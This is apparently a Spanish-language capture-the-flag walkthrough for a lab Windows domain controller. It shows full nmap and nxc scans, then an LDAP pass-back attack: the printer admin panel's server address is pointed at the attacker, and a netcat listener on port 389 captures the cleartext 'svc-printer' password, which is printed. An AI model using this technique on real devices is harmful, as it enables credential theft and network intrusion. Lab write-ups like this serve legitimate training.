
# Reconocimiento

```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.95.241 -oG allPorts
```

```shell
[*] IP Address: 10.129.95.241
[*] Open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49671,49674,49675,49678,49681,49694
```

```shell
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49671,49674,49675,49678,49681,49694 -sCV 10.129.95.241 -oN targeted
```

```shell
nxc smb 10.129.95.241
```


## HTTP
Al encontrar el puerto `80` abierto, podemos acceder a el y encontramos el panel de administración de una impresora en el cual nos deja modificar valores, encontrando el addres `printer.return.local`. el server port `389` el username `svc-printer` y el campo password `****` el cual parece que se puede modificar

Al dejarnos modificar los valores vamos a poner en el `Server Address` nuestra IP y nos pondremos en escucha con [[NETCAT]]
```shell
nc -nlvp 389
```

Obteniendo las credenciales en texto claro
```ad-hint
svc-printer::1edFg43012!!
```


